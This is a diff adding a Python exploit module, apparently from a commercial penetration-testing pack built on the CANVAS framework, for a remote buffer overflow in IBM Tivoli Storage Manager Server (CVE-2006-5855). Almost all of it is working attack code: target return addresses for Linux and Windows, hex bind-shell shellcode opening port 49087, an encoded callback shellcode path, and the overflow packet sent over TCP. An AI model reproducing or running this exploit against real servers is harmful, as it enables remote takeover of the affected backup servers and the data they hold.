@@ -1,0 +1,227 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+import random
+import time
+
+if "." not in sys.path: 
+		sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from encoder import nibble_encoder
+
+from MOSDEF import mosdef
+from shellcode import shellcodeGenerator
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "IBM Tivoli Storage Manager Server Buffer Overflow"
+
+DESCRIPTION = "Buffer overflow vulnerability in IBM Tivoli Storage Manager Server"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2006.12.04"
+DOCUMENTATION["VersionsAffected"] = "IBM Tivoli Storage Manager Server < 5.3.4"
+DOCUMENTATION["CVE Name"] = "CVE-2006-5855"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5855"
+
+NOTES="""
+Target LINUX
+==============
+
+It is hard to achieve reliable exploitation:
+
+- dsmserv is multi-thread()ed, therefore addresses are pseudo-random
+- no data on the stack
+- daemon dies if exploitation failed and will not be restarted, so
+brute force is not possible
+
+The exploit must often be initiated several times before it succeeds.
+"""
+
+DOCUMENTATION["Notes"] = NOTES
+
+VERSION = "0.1"
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"], ["Linux"] ]
+#PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+CHANGELOG="""
+"""
+
+targets = {    
+		# 0x08996765 : leave; ret
+		# 0xb341a1f8 : buffer addr (not reliable)
+		0: [ "Tivoli Storage Manager 5.3.2 - LINUX (RHES 3)", 0x08996765, 0xb341a1f8], # 0x08996765
+
+		# 
+    1: [ "Tivoli Storage Manager 5.3.2 - WINDOWS (2000, 2003)", 0x101b86ce, 0],  # add esp, 9c / ret @ adsmdll.dll
+    2: [ "Tivoli Storage Manager 5.3.3 - WINDOWS (2000, 2003)", 0x101dec4d, 0],  # add esp, 9c / ret @ adsmdll.dll
+}
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME       
+		self.host = "127.0.0.1"
+		self.port = 1500
+		self.version = 1        
+		self.badstring = "\x00\r\n"
+		return
+
+	def neededListenerTypes(self):
+
+		if targets[self.version][0].lower().find("linux") > -1:
+			from canvasengine import LINUXMOSDEF
+			return [LINUXMOSDEF]
+		if targets[self.version][0].lower().find("windows") > -1:
+			from canvasengine import WIN32MOSDEF
+			return [WIN32MOSDEF]
+
+		return []
+        
+	def createShellcode(self):                        
+
+		if targets[self.version][0].lower().find("linux") > -1:
+
+			# Shellcode bind port 49087
+			#
+			# 1/ can't use a callback shellcode because dsmserv dies after the
+			# exploitation. so the connection is broken.
+			#
+			# 2/ the solution is to use a multi shellcode but I'm not yet at 
+			# ease with API CANVAS
+			# 
+			# TODO: MOSDEF
+			# 
+			self.shellcode = "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\xb6\x0c\xb0\x03\xcd\x80\x89\xdf\xff\xe1"
+
+		elif targets[self.version][0].lower().find("windows") > -1:
+
+			try:
+			
+				self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 3000)     
+				encoder = nibble_encoder.intel_nibbleencoder()
+				encoder.setbadstring(self.badstring)
+				self.shellcode = encoder.encode(self.shellcode)
+
+			except:
+				
+				self.log ("[!] did you forget to set -l -d on the commandline !?")
+				self.shellcode = "\xcc" * 256
+		
+		#print "[!] shellcode length is %d bytes"% len(self.shellcode)
+		return self.shellcode        
+	
+	def getArgs(self):
+		"get module arguments"
+
+		self.host = int(self.argsDict.get("host", self.host))
+		self.port = int(self.argsDict.get("port", self.port))
+
+	def run(self):
+		self.getArgs()
+
+		self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+		self.log("Version %d "%(self.version))     
+		self.log("Attacking %s:%d"%(self.host, self.port))                
+
+		os_name, ret, jmp = targets[self.version]
+
+		myret = str(struct.pack('<L', ret))        
+		myjmp = str(struct.pack('<L', jmp))        
+        
+		data_1 = "\x00\x04\x1D\xA5"         
+        
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))                        
+		except socket.error:
+			self.log("No connection...")
+			return 0
+
+		if targets[self.version][0].lower().find("linux") > -1:
+			s.sendall(data_1)
+			time.sleep(5)
+			s.sendall(data_1)
+			s.close()
+
+			time.sleep(5)
+
+			s = self.gettcpsock()
+			try:
+				s.connect((self.host, self.port))
+			except socket.error:
+				self.log("No connection...")
+				return 0
+
+			s.sendall(data_1)
+
+			sploitstring = "\x08\x3E\x1A\xA5" + "\x67\x00\x00\x00\x05\x07\x01\x00\x05\x00\x05\x00\x0A\x00\x00\x01\x00\x0A\x08\xff\x2A\x3F\xDC\xF7\xFA\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x69\x6E\x4E\x54\x41\x44\x4D\x49\x4E" + "\x18\x73\x63\x65\x6E\x75\x2E\x74\x78\x74" + "A"*145 + myjmp + "A"*200 + self.shellcode + "A"*1125 + myret + "X"*507
+			s.sendall(sploitstring)
+
+			time.sleep(5)
+
+			self.setInfo("Now, check if port 49087 is listening !")
+			self.log("Now, check if port 49087 is listening !")
+
+		if targets[self.version][0].lower().find("windows") > -1:
+			s.sendall(data_1)
+			s.recv(1024)                  
+
+			# Patch the shellcode to avoid toupper effect
+			mov = "\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x7f\x83\xc6\x4b\x83\xc6\x23\x8b\x06\x83\xc0\x20\x89\x06"
+        
+			nop = "\x90"*0x2e0
+			tmp = "\x90\x90\x90\x90" + mov
+			tmp += nop[0:4]
+			tmp += self.shellcode
+			tmp += nop[4 + len(self.shellcode):]
+
+			sploitstring = "\x07\x3E\x1A\xA5" + "\x67\x00\x00\x00\x05\x07\x01\x00\x05\x00\x05\x00\x0A\x00\x00\x01\x00\x0A\x06\xff\x2A\x3F\xDC\xF7\xFA\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x69\x6E\x4E\x54\x41\x44\x4D\x49\x4E" + "\x18\x73\x63\x65\x6E\x75\x2E\x74\x78\x74" + "\x90"*0x1F5 + "\xe9\xfb\x00\x00\x00" + "\x90"*0xFB + tmp + myret + "\x90"*0x201
+			s.sendall(sploitstring)
+	               
+			# check callback
+			ret = self.ISucceeded()
+			if ret:
+				self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+				self.log("%s done (succeeded!)" % self.name)
+			else:
+				self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port), showlog=True)
+				self.log("%s done (failed!)" % self.name)
+        
+			return ret            
+        		
+	def usage(self):        
+		print "Usage: %s -v version -t host -l localip -d localport\n" % sys.argv[0]
+        
+		i = 0
+        
+		print 'Available versions:'
+        
+		for listline in targets.values():
+			print '\t%d: %s'%(i, listline[0])
+			i = i + 1
+
+		print "\nNote: callback shellcode is only use with WINDOWS target\n"
+        
+		sys.exit(0) 
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (NAME, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
